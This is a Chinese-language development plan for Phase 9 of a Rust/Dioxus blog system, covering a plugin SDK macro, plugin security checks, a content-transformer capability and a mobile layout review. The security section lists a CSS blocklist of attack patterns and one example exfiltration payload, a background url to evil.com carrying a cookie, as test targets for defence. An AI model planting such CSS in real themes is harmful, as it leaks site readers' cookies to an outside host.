# 开发计划 — Phase 9 插件生态体验 + 安全 + 响应式

> 上一阶段（Phase 8.1 – Phase 8.8，安全 & 性能硬化）见 [`Todos.md`](Todos.md)。
> 本文档承接 2026-06-01 与用户的 Phase 9 范围澄清会话：
>
> - 砍掉原 deferred 列表中"过度工程"项（Prometheus / desktop / mobile 跨端编译 / ABI v2）
> - 聚焦"个人博客 + 开源 fork 模式"下真正有价值的几条
>
> 协作约定 / 提交习惯 / 测试门禁继承自 Phase 8，简短复述见文末「持续约定」。

## 本阶段目标

把"个人博客系统"提升到"愿意外公开源代码、欢迎社区 fork 并自带插件"的体验等级。聚焦三类：

1. **插件作者体验**：消除 `unsafe extern "C"` boilerplate，让插件作者写 100% safe Rust
2. **插件安全**：沙箱（Phase 8.1 已做）之外补静态检测 / 完整性校验 / CSS 注入防线
3. **可扩展面**：新增 `content-transformer` 能力，证明 capability 表能稳定扩展（不是 placeholder）
4. **响应式适配**：博客读者主要在手机上，mobile-first review 核心页面

**不在本阶段范围**（明确踢出，**不**再"deferred 到 Phase X"）：

| 砍掉项 | 原因 |
|---|---|
| Prometheus metrics / `/metrics` endpoint | 5–50 RPS 个人站，`tracing` 日志 + 可选 `/healthz` JSON 足够 |
| desktop / mobile 跨端编译（16 处 `document::eval` 清理） | dioxus_fullstack 后端依赖 PG / 本地 FS / OAuth callback，**物理上**搬不到 mobile sandbox；响应式适配（9.4）才是真需求 |
| ABI v2（Extism / wit-bindgen 重写） | 真正瓶颈是 boilerplate（9.1 用 macro 解决） + schema 文档（9.5） + capability 面（9.3），不是二进制接口形态 |
| i18n 整表 cache / Markdown render mtime cache | 流量目标 5–50 RPS，Phase 8.5 的 list_* / theme CSS cache 已足够 |
| PluginManager single-flight / hot-reload prefill | 首次冷启动一次性事件，权衡复杂度收益不明 |
| LayoutPack::render(active, children) 重构 | Element 类型穿越 crate 边界 + feature flag 太重，Phase 8.7 navbar 已经只硬编码一次 |

---

## Design 默认值（开工前的关键选择）

| # | 决策点 | 选择 | 理由 |
|---|---|---|---|
| 1 | `#[plugin_export]` 实现形式 | proc-macro crate `crates/sdk-macros` + sdk re-export | 需要解析函数签名提取参数 / 返回类型；declarative `macro_rules!` 做不到 |
| 2 | 隐藏 unsafe 后的函数签名 | 作者写 `fn translate(req: TranslateRequest) -> String`（serde 自动），宏生成 `unsafe extern "C" fn translate(ptr, len) -> u64` | 与 Extism PDK / wasm-bindgen 同款心智模型 |
| 3 | 输入 / 输出 (de)serialize 格式 | JSON（继续）；可选 `bincode` deferred | 现有 ABI 已经 JSON，不动布局；切 bincode 等价 ABI v2，收益不抵成本 |
| 4 | Ed25519 签名是否必须 | **可选 warn-only**（缺签名 admin UI 红字提示） | fork 模式下强制签名门槛太高；签名校验仅作"我官方发布的插件"标识 |
| 5 | SHA256 lock | **必须** —— `site.json` 新增 `plugins_lock: { path: sha256 }` 字段 | 防止"文件系统被改" / "插件被偷换"；零运行时成本 |
| 6 | wasm import 白名单 | 空集（`Vec::new()`）—— **任何** import 即拒 | 当前安全模型就是纯函数 + 0 host fn；显式校验防未来误开 |
| 7 | theme CSS sanitize 策略 | 字符串扫描 + 黑名单（`url(http*)` / `@import` / `expression(` / `behavior:` / `javascript:`） | 不引入完整 CSS parser；CSS 攻击面已知模式有限 |
| 8 | content-transformer 错误处理 | fail-open（插件 trap / timeout 降级为原文 + warn log） | 单插件挂掉不能弄死所有文章；与 i18n 老插件兼容策略一致 |
| 9 | content-transformer hook 时机 | Markdown 字符串前置 + 渲染后 HTML 后置（**不**走 AST） | AST 跨 ABI 太重；字符串 in / 字符串 out 最稳 |
| 10 | 响应式 review viewport | mobile-first：375×667（iPhone SE）/ 768×1024（iPad）/ 1280×800（笔记本） | 博客读者主要手机；Tailwind 默认断点 sm=640/md=768/lg=1024 |

---

## Phase 9.1 — SDK `#[plugin_export]` proc macro（🟢 体验升级）

> 来源：Phase 9 范围澄清（2026-06-01）。当前插件作者必须写 `#[no_mangle] pub unsafe extern "C" fn ...` + 手动 `alloc` + 手动 `((ptr as u64) << 32) | len` 打包，约 5 行 unsafe boilerplate / 每个导出。新手第一眼看到 unsafe 会被劝退。

- [x] **新增 crate `crates/sdk-macros`**
   - `proc-macro = true`，依赖 `syn = "2"` + `quote = "1"` + `proc-macro2 = "1"`
   - 加入 workspace `members`，列入 sdk 的 `[dependencies]`（re-export）
- [x] **`#[plugin_export]` 属性宏**（`crates/sdk-macros/src/lib.rs`）
   - 接受形如 `fn translate(req: TranslateRequest) -> String` 的 safe Rust fn
   - 生成包装：
     1. 原 fn 重命名为 `__plugin_inner_translate`
     2. 同名 `unsafe extern "C" fn translate(ptr, len) -> u64` 入口
     3. 解析输入 → 调 inner fn → 按返回类型自动打包
   - 返回类型分派（编译期 syntax 判断）：
     - 字面 `String` → `pack_output(s.into_bytes())`
     - 字面 `&str` → `pack_output(s.as_bytes().to_vec())`
     - 字面 `Vec<u8>` → `pack_output(v)`
     - 其他（含 `PluginManifest` 等）→ `pack_json(&v)`
   - 0 / 1 参数自动分派；多参数 / async / unsafe / method 直接编译期报错
- [x] **`#[plugin_manifest]` 函数宏** —— 不需要单独实现
   - `#[plugin_export]` 已覆盖 0 参数 + 返回 PluginManifest 自动 `pack_json` 的场景
- [x] **改造 i18n-fluent 做基准验证**（`crates/plugins/i18n-fluent/src/lib.rs`）
   - 从 60 行手写 unsafe → 41 行 0 unsafe（核心逻辑无变化）
   - 加 `serde = { derive }` 依赖，`TranslateRequest` 改为 `#[derive(Deserialize)]` 结构体
   - 真实集成测试 `test_i18n_fluent_plugin` 通过；plugin engine 10 个测试全过
   - wasm 体积 297k → 314k（+5.7%，serde derive 引入，可接受）
   - 注：其余 7 个内置插件留作 Phase 9.5 文档样例时再 opt-in 改造，不强制
- [ ] **PLUGIN_DEV.md §3 样例重写**：从 50 行缩到 10 行 —— 留给 Phase 9.5
   - 新增 §3.0 "为什么看不到 unsafe"小节解释宏展开
- [x] CI：`cargo check --workspace --features server` 通过；`cargo clippy -p sdk-macros -p sdk -p i18n-fluent-plugin -p app-core --features server -- -D warnings` 0 warning

**完成定义**：第三方读 PLUGIN_DEV.md 第 3 节 ≤10 行 safe Rust 写出可工作主题；i18n-fluent 用宏改造后单测通过、wasm 体积持平。

---

## Phase 9.2 — 插件安全检测套件（🔴 上线前必做）

> 来源：Phase 9 范围澄清（2026-06-01）。Phase 8.1 已经做完沙箱（fuel / memory / timeout / 输出 clamp），但**装载前的静态检测**和**完整性校验**完全没有。fork 用户装第三方插件存在以下未防线：CSS 注入 / wasm 偷开 IO import / 文件被偷换 / capability 伪装。

- [ ] **wasm import 静态扫描**（`crates/core/src/engines/plugin.rs`）
   - `PluginManager::load_module` 在 `Module::new` 之后、注册到缓存之前，用 `wasmi::Module::imports()` 枚举所有 import
   - 白名单 = ∅（当前宿主未暴露任何 host fn）；非空即拒 `AppError::Plugin("plugin declares disallowed imports: ...")`
   - 单测：构造一个含 `(import "env" "log" (func ...))` 的最小 wasm，验证拒绝
- [ ] **manifest ↔ exports 一致性校验**（同上文件）
   - 每个 capability 定义"期望 exports 集合"：
     - `theme` → `{get_manifest, get_theme_css}`（可选 `dealloc`）
     - `i18n` → `{get_manifest, translate}`
     - `auth-provider` → `{get_manifest, get_config, exchange_code, fetch_profile, get_display_info}`
     - `moderation-provider` → `{get_manifest, moderation_build_prompt, moderation_parse_verdict}`
     - `content-transformer` → `{get_manifest, transform_markdown}`（9.3 加）
   - 实际导出超出"必备 + 可选"集合 → warn log（不拒，可能是新 ABI 版本），但记录
   - capability 声明但缺必备 export → 拒绝
   - 单测：theme 插件偷偷导出 `exchange_code` → warn；i18n 缺 `translate` → 拒
- [ ] **theme CSS allowlist sanitizer**（`crates/core/src/engines/theme.rs` 或新建 `theme_sanitize.rs`）
   - 在 `aggregate_theme_css_paths` 拼接前对每段 CSS 字符串扫描黑名单 pattern（大小写不敏感）：
     - `url(http://` / `url(https://` / `url(//` — 拒绝外部 URL（防 `background: url(https://evil.com/?cookie=...)` 数据外渗）
     - `url(data:` 后非 `image/` MIME — 拒（防 SVG XSS）
     - `@import` — 全拒
     - `expression(` — 拒（旧 IE 攻击向量）
     - `behavior:` — 拒（IE）
     - `javascript:` / `vbscript:` — 拒
   - 命中即整个插件 CSS 不加入聚合，admin log warn，前端走默认主题
   - 单测：6 类攻击 pattern 全部命中拒绝；正常 `url(/assets/...)` / `url(data:image/png;base64,...)` 通过
- [ ] **SHA256 lock**（`assets/site.json` + `crates/core/src/lib.rs`）
   - `site.json` 新增字段 `plugins_lock: { "theme_ocean_plugin.wasm": "<sha256>" }`
   - `PluginManager::get_or_load_module` 在 `fs::read` 后立即 `sha2::Sha256` 比对
   - 不匹配 → 拒绝 + warn `plugin <name> sha256 mismatch (expected X, got Y)`
   - 缺 lock 字段 → 当前阶段 **warn but allow**（向后兼容；后续 Phase 9.x 可升级为 strict）
   - 提供 CLI 工具 `cargo run -p app --bin lock_plugins` 一键扫 `assets/plugins/*.wasm` 写入 site.json
   - 单测：故意改 1 字节验证拒绝
- [ ] **Ed25519 签名校验 — warn-only**（`crates/core/src/lib.rs`）
   - `assets/plugins/<name>.wasm.sig` 旁路文件（detached signature）
   - `assets/trusted_keys.pem` 列出可信公钥（可多个）
   - 校验失败 / 缺 sig → admin UI plugin 列表展示橙色"unsigned"标识（不拒加载）
   - 校验通过 → 绿色"signed by ..."标识
   - 单测：用 `ed25519-dalek` 生成测试密钥对，签 / 验闭环
- [ ] **接入 `admin_upload_plugin`**（`crates/modules/admin/src/server.rs`）
   - 上传时立即跑：import scan + manifest 一致性 + sha256 计算（写回 site.json） + 签名校验（warn only）
   - 任何 hard reject 项触发 → 删临时文件 + 返回 400 + JSON 错误体
- [ ] CI：`cargo test --features server -p app-core --lib` 通过；新增 ~15 个单测

**完成定义**：恶意 wasm 含 `(import "wasi_snapshot_preview1" ...)` 加载即拒；恶意 theme CSS 含 `url(http://evil.com)` 不会进 `<style>`；plugin 文件改 1 字节即拒；admin UI 能看到每个插件的"signed/unsigned"标识。

---

## Phase 9.3 — `content-transformer` capability（🟡 扩展面证明）

> 来源：Phase 9 范围澄清（2026-06-01）。当前 capability 表里 `layout` / `notification` / `mdx-component` 都是 placeholder（SDK 有常量但宿主没接）。需要至少一个"真正实现过一遍"的扩展型 capability 证明 ABI 表能稳定加新行。`content-transformer` 是博客系统最自然的扩展点（自动加 TOC / 图片 lazy / 自动检测断链等）。

- [ ] **SDK 加常量**（`crates/sdk/src/lib.rs`）
   - `pub const CONTENT_TRANSFORMER: &str = "content-transformer";` 入 `capabilities` 模块
   - 新增类型 `TransformRequest { content: String, kind: String, stage: String }` + `TransformResponse { content: String, changed: bool }`
   - `kind`：`"blog"` / `"doc"` / `"podcast"` / `"forum-topic"` 等业务类型
   - `stage`：`"pre"`（Markdown 字符串）/ `"post"`（渲染后 HTML 字符串）
- [ ] **宿主 `ContentTransformerEngine`**（`crates/core/src/engines/content_transformer.rs`）
   - `apply(content, kind, stage) -> String`：遍历声明该 capability 的所有插件，串行 chain（前一个输出作为下一个输入）
   - fail-open：任何插件 trap / timeout / 返回空 → 跳过该插件 + warn log，链路继续
   - 集成进 PluginManager；Phase 8.7 ModuleEngine 加 enabled 检查
- [ ] **Markdown 渲染管线接入**（`crates/widgets/src/mdx.rs`）
   - `pre` hook：Markdown 解析前调 `engine.apply(md_str, kind, "pre")`
   - `post` hook：HTML 渲染完成后调 `engine.apply(html_str, kind, "post")`
   - 性能：默认开关 env `CONTENT_TRANSFORMER_DISABLE=true` 可关；启用插件 0 时直通短路（不走 wasm）
- [ ] **示例插件 `crates/plugins/content-toc`**
   - `transform_markdown` 实现：检测 `# H1` / `## H2` heading，在第一段后插入 `[[toc]]` 形式的 TOC 标记 + 加锚点
   - 用 `#[plugin_export]`（9.1 的宏）写，证明宏 + 新 capability 双 stack 跑通
   - 单测：核心 fn `inject_toc(md: &str) -> String` 覆盖 5 个边界（无 heading / 仅 H1 / 多级嵌套 / 已有 [[toc]] / 文末 heading）
- [ ] **build_themes.sh 兼容**：脚本归一化命名 `content_toc_plugin`，产物拷贝到 `assets/plugins/`
- [ ] **`assets/site.json` 新增字段** `content_transformers: ["content_toc_plugin.wasm"]`，默认空数组
- [ ] **PLUGIN_ABI.md §2.3 表**：加 `content-transformer | transform_markdown | TransformRequest JSON | TransformResponse JSON` 行
- [ ] **`docs/CONTENT_TRANSFORMER_SPEC.md`**（新建）：完整 ABI 说明 + kind/stage 约定 + 链式 chain 语义 + 示例

**完成定义**：开启 `content-toc` 插件后 `/blog/welcome` 自动出 TOC；插件 trap 不影响文章渲染（fail-open 验证）；ABI 表新增一个真正实现过的 capability。

---

## Phase 9.4 — 响应式适配 review（🟡 体验完善）

> 来源：Phase 9 范围澄清（2026-06-01）。博客读者主要在手机上看文章，但 Phase 1-8 全程基于桌面浏览器验证，从未系统跑过 mobile viewport。需要一次性扫核心页面 + 修 Tailwind 断点。

- [ ] **环境准备**：`dx serve` 起本地；Playwright 装上（项目已有 `mcp__plugin_playwright_playwright__*` 工具）
- [ ] **扫描矩阵**：3 个 viewport × 7 个核心页面 = 21 张截图
   - viewport：mobile 375×667 / tablet 768×1024 / desktop 1280×800
   - 页面：
     - `/` 首页
     - `/blog/welcome` 长文详情
     - `/blog` 列表
     - `/forum` 论坛列表
     - `/forum/<topic>` 话题详情
     - `/admin` 后台（如果可登录）
     - `/ai`（任一板块，覆盖 modules 路由）
- [ ] **问题清单**（建在 `docs/PHASE9_RESPONSIVE_AUDIT.md`）
   - 每个截图对照桌面版列 issue：溢出 / 文字过小 / 触摸目标 < 44px / 横向滚动 / 图片不缩放 / nav 抽屉缺失 / 表格不滚动 ...
   - issue 按页面分组，每条带"修复建议（哪个 Tailwind 类）"
- [ ] **按清单逐项修**
   - 仅动 `crates/app/src/components/` 和 `crates/modules/*/src/components/` 下的 Dioxus rsx
   - 优先使用 Tailwind 断点修饰符（`sm:` / `md:` / `lg:`），不引入媒体查询 CSS
   - 每改一项截图复测，附 before/after 对比到 audit 文档
- [ ] **触屏交互 review**（手动）
   - 评论 / 话题回复表单的按钮触摸面积、抽屉打开关闭、深色模式切换、ThemePicker
- [ ] **关键页面性能**：用 Lighthouse mobile 跑 `/` + `/blog/welcome`，Performance ≥ 70 / Accessibility ≥ 90（基线，不强制）

**完成定义**：3 档 viewport 下 7 个核心页面无破版 / 无溢出 / 无不可达交互；`docs/PHASE9_RESPONSIVE_AUDIT.md` 完整记录修复前后截图。

---

## Phase 9.5 — PLUGIN_DEV.md 重写 + 审计指南（🟢 文档）

> 来源：Phase 9 范围澄清（2026-06-01）。9.1 / 9.2 / 9.3 都在动 ABI 表面或新加规范，文档必须同步。同时缺一节"第三方插件如何审计"，对开源 fork 模式至关重要。

- [ ] **PLUGIN_DEV.md §3 重写**（依赖 9.1）
   - 主题样例改用 `#[plugin_export]`，从 50 行 → 10 行；明示"看不到 unsafe 是因为宏展开"
   - §6.1 i18n 模板也改新 macro 写法
- [ ] **PLUGIN_DEV.md §6.3 moderation 模板补完**
   - 当前是"ABI 待定"，Phase 4.3 已完成；补 `moderation_build_prompt` / `moderation_parse_verdict` 真实样例
- [ ] **PLUGIN_DEV.md §6.4 新增 content-transformer 模板**（依赖 9.3）
   - 展示如何用 `#[plugin_export]` 加 `transform_markdown`
- [ ] **PLUGIN_DEV.md §12「如何审计第三方插件」新章节**
   - 沙箱已挡（Phase 8.1）：fuel / memory / timeout / output cap → 物理隔离，**插件偷文件 / 偷 DB / 上网都不可能**
   - 安全检测套件（Phase 9.2）：wasm import scan / CSS allowlist / manifest 一致性 / SHA256 lock / Ed25519 签名
   - 永远检测不了的（必须人工 review 源码）：i18n 翻译篡改 / Auth 插件偷塞额外字段 / 时间炸弹
   - 信任链建议：fork 者**只信任**自己签名的 + 仓库审过 PR 的 + 自己读过源码的；其他一律 unsigned 警告
- [ ] **PLUGIN_ABI.md §2.3 表更新**
   - 新增 `content-transformer` 行（依赖 9.3）
   - `moderation-provider` 行去掉"(Phase 4.3)"标注
- [ ] **PLUGIN_ABI.md §9 内置插件清单更新**
   - 加 `content-toc | content-transformer | content_toc_plugin.wasm` 行（依赖 9.3）
- [ ] **`docs/CONTENT_TRANSFORMER_SPEC.md` finalize**（依赖 9.3）

**完成定义**：第三方从 0 开始读 PLUGIN_DEV.md 30 分钟内可写 + 部署一个 content-transformer 插件；audit 指南覆盖"什么能挡 / 什么挡不住"，让 fork 者心里有数。

---

## 进度跟踪

| Phase | 状态 | 关键交付 | 依赖 |
|---|---|---|---|
| 9.1 | ✅ Mostly Done | `#[plugin_export]` proc macro + i18n 改造 0 unsafe + 集成测试通过（PLUGIN_DEV.md 样例重写留 9.5） | — |
| 9.2 | 🟡 Pending | wasm import scan + CSS sanitize + manifest 一致性 + SHA256 lock + Ed25519 warn | — |
| 9.3 | 🟡 Pending | content-transformer capability + content-toc 示例插件 + SPEC | 9.1 (macro) / 9.2 (manifest 一致性表加新行) |
| 9.4 | 🟡 Pending | 3 viewport × 7 页面 audit + 修 Tailwind 断点 | — |
| 9.5 | 🟡 Pending | PLUGIN_DEV.md 重写 + 审计指南章节 | 9.1 / 9.3 |

---

## 验收标准（全 Phase 9 完成）

- **测试**：`cargo test --features server --workspace -- --test-threads=1` 全绿（预计 ~640+ tests）
- **clippy**：`cargo clippy --features server --workspace --all-targets -- -D warnings` 0 warning
- **插件作者体验**：PLUGIN_DEV.md §3 主题样例 ≤ 12 行可见代码，作者**视觉上 0 个 unsafe**
- **安全**：
   - 含 `(import ...)` 的 wasm 加载即拒
   - 含 `url(http://...)` 的 theme CSS 不进 `<style>`
   - 改 1 字节的 wasm 文件加载即拒（SHA256 mismatch）
   - admin UI 能看到每个插件 signed/unsigned 标识
- **扩展面**：开启 `content-toc` 插件后 blog 文章自动出 TOC；关闭后恢复原文
- **响应式**：mobile 375×667 下 7 个核心页面无破版、无横向滚动、所有可点击元素触摸面积 ≥ 44×44
- **文档**：PLUGIN_DEV.md / PLUGIN_ABI.md / CONTENT_TRANSFORMER_SPEC.md 同步；PHASE9_RESPONSIVE_AUDIT.md 留档
- **手动验证**：`cd crates/app && dx serve` 启动正常；admin 上传一个故意构造的恶意 wasm 被拒并看到清晰错误信息

---

## 持续约定（继承自 Phase 1-8）

- 每完成一个独立功能立即 commit，不批量打包
- 提交信息走 Conventional Commits（`feat(9.1): ...` / `fix` / `refactor` 等）
- **不附 `Co-Authored-By`**（沿用 [Memory: workflow-conventions]）
- `cargo test` + `cargo clippy -- -D warnings` 通过才允许 commit
- 完成每个 sub-item 后立即把对应 `[ ]` 改为 `[x]` + 补简短实施说明（同 Phase 1-8 风格）
- `git push` 时机由用户决定，本计划只推进到本地 commit
- **Out of scope 守护**：本阶段**不**做 Prometheus / 跨端编译 / ABI v2 / 完整 markdown render cache / single-flight。原 Phase 8 deferred 列表中未列入本计划的项一律不动

---

## 引用

- 上一阶段计划：[`Todos.md`](Todos.md)（Phase 8 安全 & 性能硬化）
- Phase 1-7 历史：[`Todos.phase1-7.md`](Todos.phase1-7.md)
- 范围澄清会话：2026-06-01 与用户讨论"Phase 9 是否真要做 Prometheus / desktop-mobile / ABI v2"，全部砍掉
- 核心 SPEC：[`docs/PLUGIN_ABI.md`](docs/PLUGIN_ABI.md) / [`docs/PLUGIN_DEV.md`](docs/PLUGIN_DEV.md) / [`docs/ENGINES_SPEC.md`](docs/ENGINES_SPEC.md) / [`docs/THEME_SPEC.md`](docs/THEME_SPEC.md) / [`docs/MODULE_SPEC.md`](docs/MODULE_SPEC.md)
